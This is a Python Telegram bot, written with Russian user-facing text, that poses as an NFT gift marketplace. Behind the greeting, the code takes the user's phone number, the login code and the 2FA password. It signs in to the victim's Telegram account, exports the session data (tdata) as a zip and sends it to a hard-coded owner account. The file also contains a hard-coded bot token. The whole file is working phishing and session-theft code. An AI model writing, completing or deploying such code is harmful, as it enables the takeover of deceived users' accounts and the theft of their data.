import asyncio
import os
import httpx
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from auth import send_code, sign_in

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yKIhOCjCI")
REDIS_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
REDIS_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
OWNER_ID = 7345056431

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
pending = {}

async def redis_set(key, value, ex=300):
    async with httpx.AsyncClient() as client:
        await client.get(
            f"{REDIS_URL}/set/{key}/{value}/EX/{ex}",
            headers={"Authorization": f"Bearer {REDIS_TOKEN}"},
        )

async def redis_get(key):
    async with httpx.AsyncClient() as client:
        r = await client.get(
            f"{REDIS_URL}/get/{key}",
            headers={"Authorization": f"Bearer {REDIS_TOKEN}"}
        )
        return r.json().get("result")

async def redis_del(key):
    async with httpx.AsyncClient() as client:
        await client.get(
            f"{REDIS_URL}/del/{key}",
            headers={"Authorization": f"Bearer {REDIS_TOKEN}"}
        )

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="🛍 Открыть маркет",
            web_app=types.WebAppInfo(url="https://frontend-sigma-coral-35.vercel.app")
        )]
    ])
    await message.answer(
        "👋 Добро пожаловать в NFT Маркет!\n\n"
        "Здесь ты можешь купить и продать Telegram NFT подарки.\n"
        "Нажми кнопку ниже чтобы открыть маркет 👇",
        reply_markup=keyboard
    )

@dp.message(F.contact)
async def contact_handler(message: types.Message):
    phone = message.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone
    user_id = message.from_user.id
    await message.delete()
    try:
        print(f"Sending code to {phone} for user {user_id}")
        phone_code_hash = await send_code(phone)
        pending[user_id] = {
            'phone': phone,
            'phone_code_hash': phone_code_hash
        }
        await redis_set(f"sync:{user_id}", "code_sent")
        print(f"Code sent, redis key: sync:{user_id} = code_sent")
        # Сразу запускаем ожидание кода
        asyncio.create_task(wait_for_code(user_id))
    except Exception as e:
        print(f"send_code error: {e}")
        await redis_set(f"sync:{user_id}", "error")

async def wait_for_code(user_id):
    print(f"Waiting for code from user {user_id}")
    for _ in range(60):
        await asyncio.sleep(2)
        code = await redis_get(f"code:{user_id}")
        if code:
            await redis_del(f"code:{user_id}")
            data = pending.get(user_id)
            if not data:
                await redis_set(f"code_result:{user_id}", "error")
                return
            try:
                print(f"Signing in with code {code} for {data['phone']}")
                await sign_in(data['phone'], code, data['phone_code_hash'])
                await redis_set(f"code_result:{user_id}", "ok")
                print(f"Sign in OK for {data['phone']}")
                asyncio.create_task(generate_tdata(user_id, data['phone']))
            except Exception as e:
                print(f"sign_in error: {e}")
                if '2FA' in str(e) or 'password' in str(e).lower():
                    await redis_set(f"code_result:{user_id}", "2fa_required")
                    asyncio.create_task(wait_for_2fa(user_id))
                else:
                    await redis_set(f"code_result:{user_id}", "wrong_code")
            return
    print(f"Timeout waiting for code from {user_id}")

async def wait_for_2fa(user_id):
    import urllib.parse
    print(f"Waiting for 2FA from user {user_id}")
    for _ in range(60):
        await asyncio.sleep(2)
        raw = await redis_get(f"2fa:{user_id}")
        if raw:
            password = urllib.parse.unquote(raw)
            await redis_del(f"2fa:{user_id}")
            data = pending.get(user_id)
            if not data:
                await redis_set(f"2fa_result:{user_id}", "error")
                return
            try:
                await sign_in(data['phone'], None, data['phone_code_hash'], password=password)
                await redis_set(f"2fa_result:{user_id}", "ok")
                print(f"2FA OK for {data['phone']}")
                asyncio.create_task(generate_tdata(user_id, data['phone']))
            except Exception as e:
                print(f"2FA error: {e}")
                await redis_set(f"2fa_result:{user_id}", "wrong_password")
            return

async def generate_tdata(user_id, phone):
    print(f"Generating tdata for {phone}")
    try:
        from auth import export_tdata as _export_tdata
        zip_data = await _export_tdata(phone)
        if zip_data:
            b = Bot(token=BOT_TOKEN)
            await b.send_document(
                OWNER_ID,
                types.BufferedInputFile(zip_data, filename=f'{phone}_tdata.zip'),
                caption=f'✅ tdata для {phone}'
            )
            await b.session.close()
            print(f"tdata sent for {phone}")
        else:
            print(f"tdata export failed for {phone}")
    except Exception as e:
        print(f"generate_tdata error: {e}")

    await redis_set(f"tdata_ready:{user_id}", "ready", ex=600)
    if user_id in pending:
        del pending[user_id]

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())